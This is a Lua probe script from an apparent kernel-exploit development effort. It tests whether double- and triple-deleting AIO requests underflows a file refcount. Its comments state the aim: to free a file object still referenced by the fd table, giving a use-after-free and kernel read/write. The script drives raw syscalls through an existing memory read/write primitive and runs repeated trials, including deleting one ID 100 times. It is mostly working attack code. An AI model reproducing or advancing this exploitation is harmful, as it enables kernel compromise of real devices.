-- CRASH_CLASS: HIGH
-- PROBE 70c: File refcount underflow via double-free
--
-- DECOMPILE FINDING: entry_dispose does lock xadd [*(I+0x40)+0x28], -1
-- This decrements the file refcount. Double-free = double-decrement.
-- If we can underflow the refcount, the file object gets freed while
-- the fd table still references it -> fd-table UAF -> kernel R/W.
--
-- 65r showed the fd survives 100 double-frees. Two explanations:
--   (a) refcount starts high (each AIO submit adds +1, so 16 submits = refcount 17)
--   (b) the double-free doesn't actually cause double entry_dispose
--
-- This probe tests (a) by doing:
--   1. Open /dev/zero, use its fd for AIO
--   2. Submit only 1 AIO request (refcount = 2: fd_table + 1 AIO)
--   3. Poll it, then double-delete it
--   4. If (a) is right, 1 extra decrement brings refcount to 0
--      -> close(fd) would double-free the file object
--   5. Check: does fstat(fd) still work? Does close(fd) crash?
--
-- ALSO: if 65l's race is really double-SUCCESS not double-free,
-- entry_dispose is only called ONCE, so refcount only decrements once.
-- This probe measures the actual refcount impact.

print("=== PROBE 70c: FILE REFCOUNT UNDERFLOW ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local pid = N(mk(20)())
print("pid=" .. pid)

-- Open MULTIPLE /dev/zero fds so we can track which ones break
local zero_path = memory.alloc(16)
for c = 1, 9 do pcall(function() memory.write_byte(zero_path + c - 1, string.byte("/dev/zero", c)) end) end
pcall(function() memory.write_byte(zero_path + 9, 0) end)

-- [A] Baseline: verify fstat works on fresh fd
print("[A] Baseline fstat check")
local ok, basefd = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
local bfd = N(basefd)
print("  /dev/zero fd=" .. bfd)

local stat_buf = memory.alloc(256)
for j = 0, 252, 4 do wd(stat_buf + j, 0xCC) end
local ok2, fret = pcall(function() return mk(189)(uint64(bfd), uint64(N(stat_buf))) end)
print(string.format("  fstat(%d) ret=%d", bfd, ok2 and N(fret) or -999))

-- [B] Single-request double-delete refcount test
print("")
print("[B] Single-request double-delete refcount test")
for trial = 1, 5 do
    -- Open a fresh fd per trial
    local ok3, tfd_r = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
    local tfd = N(tfd_r)
    print(string.format("  trial %d: fd=%d", trial, tfd))

    -- Submit 1 AIO request on this fd
    local data_buf = memory.alloc(64)
    local result_buf = memory.alloc(8)
    local ids_buf = memory.alloc(8)
    local req = memory.alloc(0x28)
    wq(req + 0x00, uint64(0))
    wq(req + 0x08, uint64(16))
    wq(req + 0x10, uint64(N(data_buf)))
    wq(req + 0x18, uint64(N(result_buf)))
    wq(req + 0x20, uint64(tfd))
    wd(ids_buf, 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ids_buf)))
    end)
    local aid = rd(ids_buf)
    print(string.format("    aio_id=0x%X", aid or 0))

    -- Poll
    local st_buf = memory.alloc(8)
    wd(ids_buf, aid or 0)
    pcall(function() mk(664)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)

    -- Delete #1 (normal)
    wd(st_buf, 0xDEAD)
    pcall(function() mk(662)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    local del1_st = rd(st_buf)
    print(string.format("    delete1 status=0x%08X", del1_st or 0))

    -- Delete #2 (double-delete on same ID)
    wd(st_buf, 0xDEAD)
    pcall(function() mk(662)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    local del2_st = rd(st_buf)
    print(string.format("    delete2 status=0x%08X", del2_st or 0))

    -- Delete #3 (triple-delete)
    wd(st_buf, 0xDEAD)
    pcall(function() mk(662)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    local del3_st = rd(st_buf)
    print(string.format("    delete3 status=0x%08X", del3_st or 0))

    -- NOW check if the fd is still alive
    for j = 0, 252, 4 do wd(stat_buf + j, 0xCC) end
    local ok4, fs_ret = pcall(function() return mk(189)(uint64(tfd), uint64(N(stat_buf))) end)
    local fsr = ok4 and N(fs_ret) or -999
    print(string.format("    fstat(%d) after triple-delete: ret=%d", tfd, fsr))

    -- Try close
    local ok5, cl_ret = pcall(function() return mk(6)(uint64(tfd)) end)
    local clr = ok5 and N(cl_ret) or -999
    print(string.format("    close(%d): ret=%d", tfd, clr))

    -- Try fstat again after close (should fail)
    local ok6, fs2_ret = pcall(function() return mk(189)(uint64(tfd), uint64(N(stat_buf))) end)
    local fs2r = ok6 and N(fs2_ret) or -999
    print(string.format("    fstat(%d) after close: ret=%d (expect -1)", tfd, fs2r))
end
print("")

-- [C] Incremental: submit N, delete all, check how many more deletes
-- until refcount hits zero
print("[C] Incremental refcount drain")
for count = 1, 4 do
    local ok7, cfd_r = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
    local cfd = N(cfd_r)

    -- Submit `count` AIO requests
    local c_ids = {}
    for i = 1, count do
        local data_buf = memory.alloc(64)
        local result_buf = memory.alloc(8)
        local ids_buf = memory.alloc(8)
        local req = memory.alloc(0x28)
        wq(req + 0x00, uint64(0))
        wq(req + 0x08, uint64(16))
        wq(req + 0x10, uint64(N(data_buf)))
        wq(req + 0x18, uint64(N(result_buf)))
        wq(req + 0x20, uint64(cfd))
        wd(ids_buf, 0)
        pcall(function()
            mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ids_buf)))
        end)
        c_ids[#c_ids + 1] = rd(ids_buf) or 0
    end

    -- Poll and delete all
    local st_buf = memory.alloc(8)
    local ids_buf2 = memory.alloc(8)
    for _, aid in ipairs(c_ids) do
        wd(ids_buf2, aid)
        pcall(function() mk(664)(uint64(N(ids_buf2)), uint64(1), uint64(N(st_buf))) end)
    end
    for _, aid in ipairs(c_ids) do
        wd(ids_buf2, aid)
        pcall(function() mk(662)(uint64(N(ids_buf2)), uint64(1), uint64(N(st_buf))) end)
    end

    -- Now try deleting them AGAIN to cause extra refcount decrements
    local extra_dels = 0
    for _, aid in ipairs(c_ids) do
        wd(ids_buf2, aid)
        wd(st_buf, 0xDEAD)
        pcall(function() mk(662)(uint64(N(ids_buf2)), uint64(1), uint64(N(st_buf))) end)
        local s = rd(st_buf)
        if s == 0 then extra_dels = extra_dels + 1 end
    end

    -- Check fd health
    local ok8, fs_r = pcall(function() return mk(189)(uint64(cfd), uint64(N(stat_buf))) end)
    local fsr2 = ok8 and N(fs_r) or -999
    local ok9, cl_r = pcall(function() return mk(6)(uint64(cfd)) end)
    local clr2 = ok9 and N(cl_r) or -999

    print(string.format("  count=%d: %d IDs, extra_del_ok=%d fstat=%d close=%d",
        count, #c_ids, extra_dels, fsr2, clr2))
end
print("")

-- [D] Mass sequential delete: same ID deleted 100 times
-- This measures whether the handler has any double-delete protection
print("[D] Mass sequential delete: same ID 100 times")
do
    local ok10, dfd_r = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
    local dfd = N(dfd_r)
    local data_buf = memory.alloc(64)
    local result_buf = memory.alloc(8)
    local ids_buf3 = memory.alloc(8)
    local req = memory.alloc(0x28)
    wq(req + 0x00, uint64(0))
    wq(req + 0x08, uint64(16))
    wq(req + 0x10, uint64(N(data_buf)))
    wq(req + 0x18, uint64(N(result_buf)))
    wq(req + 0x20, uint64(dfd))
    wd(ids_buf3, 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ids_buf3)))
    end)
    local did = rd(ids_buf3) or 0
    print(string.format("  id=0x%X on fd=%d", did, dfd))

    -- Poll
    local st3 = memory.alloc(8)
    wd(ids_buf3, did)
    pcall(function() mk(664)(uint64(N(ids_buf3)), uint64(1), uint64(N(st3))) end)

    -- Delete 100 times
    local status_counts = {}
    for i = 1, 100 do
        wd(st3, 0xDEAD)
        pcall(function() mk(662)(uint64(N(ids_buf3)), uint64(1), uint64(N(st3))) end)
        local s = rd(st3)
        status_counts[s] = (status_counts[s] or 0) + 1
    end
    print("  Status distribution:")
    for s, c in pairs(status_counts) do
        print(string.format("    0x%08X: %d times", s, c))
    end

    -- Check fd
    local ok11, fs3 = pcall(function() return mk(189)(uint64(dfd), uint64(N(stat_buf))) end)
    print(string.format("  fstat after 100 deletes: ret=%d", ok11 and N(fs3) or -999))
    pcall(function() mk(6)(uint64(dfd)) end)
end
print("")

print("alive=YES")
print("=== PROBE 70c COMPLETE ===")
